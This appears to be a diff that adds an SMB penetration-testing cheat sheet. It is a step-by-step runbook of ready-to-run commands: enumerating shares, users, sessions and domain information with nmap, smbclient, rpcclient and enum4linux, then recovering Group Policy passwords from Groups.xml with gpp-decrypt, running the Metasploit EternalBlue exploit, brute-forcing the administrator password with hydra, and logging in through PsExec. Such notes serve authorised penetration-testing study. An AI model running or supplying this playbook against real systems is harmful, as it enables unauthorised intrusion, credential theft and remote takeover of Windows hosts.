@@ -1,0 +1,124 @@
+#################################################################################################
+	
+	+------------------+
+	|  COMBO SCANNING  |
+	+------------------+
+
+	Command: smbenum
+
+#################################################################################################
+
+	1) ENUMERATE VERSION
+	
+	nmap -Pn -sC -sV -p445 <ip> 
+	nmap -Pn --script=banner -sV -p445 <ip>
+	nmap -Pn --script=smb-os-discovery -sV -p445 <ip>
+	nmap -Pn --script=smb-enum-services -sV -p445 <target_ip>
+
+
+
+#################################################################################################
+
+	2) ENUMERATE SHARES
+	+-----------------------------------------------+
+	| Shared folders and resources			|
+	| Permissions and access levels for each share	|
+	+-----------------------------------------------+
+	
+	smbclient //<ip>   OR   smbclient "\\\\<ip>"
+	nmap --script=smb-enum-shares -p 445 <ip>
+	smbmap -H <ip>
+	
+	msfconsole -q 
+	use auxiliary/scanner/smb/smb_enumshares
+
+#################################################################################################
+
+	3) ENUMERATE USERS/ USERNAMES
+	+------------------------------------------------------------------------+
+	| List of user accounts							 |
+	| Group memberships							 |
+	| User account policies (e.g., password policies, lockout policies)	 |
+	+------------------------------------------------------------------------+
+		
+	smbclient -L //<ip> -U ""
+	rpcclient -U "" <ip> -c "enumdomusers"
+	nmap --script=smb-enum-users -p445 -Pn -sV <ip>
+	
+	msfconsole -q
+	use auxiliary/scanner/smb/smb_enumusers
+	set RHOSTS <ip>
+	run
+
+	smbmap -R Replication -H <ip> -A Groups.xml -q <------- If 'Replication' File Exists
+	updatedb
+	locate Groups.xml
+	gpp-decrypt <password> 
+
+#################################################################################################	
+
+	4) ENUMERATE SESSIONS
+	+--------------------------------------+
+	| Active sessions and connected users  |
+	| Files currently open or in use       |
+	+--------------------------------------+
+
+	
+	rpcclient -U "" <ip> -c "srvinfo" 			(server info including sessions)
+	nmap --script smb-enum-sessions -p 445 <ip>
+	
+#################################################################################################
+
+	5) ENUMERATE DOMAIN INFORMATION
+	+-----------------------+
+	| Domain controllers	|
+	| Trust relationships	|
+	| Domain policies	|
+	+-----------------------+
+
+	
+	enum4linux -D <ip>
+	rpcclient -U "" <ip> -c "lsaquery"
+	Nmap --script smb-enum-domains -p 445 <ip>
+	
+#################################################################################################
+
+	6) CHECK ETERNAL-BLUE EXPLOIT
+	+-----------------------------------------------+
+	| A hacker's dream!				|
+	| Vulnerability with no credentials needed!	|
+	+-----------------------------------------------+
+
+	msfconsole -q
+	use exploit/windows/smb/ms17_010_eternalblue
+	set RHOSTS <ip>
+	check
+	run
+
+#################################################################################################
+
+
+	7) CREDENTIALS FOR PSEXEC LOGIN
+	+---------------------------------------+
+	| Using PSexec To Login			|
+	| Admin user with escalated privileges	|
+	+---------------------------------------+
+
+	hydra -l administrator -P <Pass-File> <ip> smb -t4
+		OR (DEPENDING ON SMB SERVICES)
+	hydra -l administrator -P <Pass-File> <ip> smb2 -t4
+			OR
+	hydra -l administrator -P <Pass-File> <ip> smb://<ip> -t4
+	
+ 	msfconsole -q 
+ 	search psexec
+ 	use <id>
+	set rhosts <ip>
+	set smbuser administrator
+ 	set smbpass <smb-password>
+ 	run  <------------------------ Try running at least 2 times. 
+		
+
+#################################################################################################
+
+
